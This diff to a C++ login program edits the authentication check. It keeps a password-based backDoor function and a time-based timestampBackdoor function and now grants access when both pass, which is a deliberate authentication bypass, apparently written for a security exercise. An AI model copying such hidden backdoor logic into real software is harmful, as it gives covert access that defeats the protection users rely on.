@@ -40,6 +40,7 @@ bool backDoor(const string& password) {
     }
 }
 
+
 bool timestampBackdoor() {
     time_t now = time(0);
     tm *ltm = localtime(&now);
@@ -75,7 +76,7 @@ int main() {
         // If Authenticated, Exit indicating successful authentication
         // For incorrect login details, reject, clear screen and re-prompt input
         // If maximum attempts exceeded, reject the user
-        if (isAuthenticated || backDoor() || timestampBackdoor()) {
+        if (isAuthenticated || backDoor(passwordIn) && timestampBackdoor()) {
             authenticated(usernameIn);
             return 0;
         } else if(attempts < MAX_ATTEMPTS) {
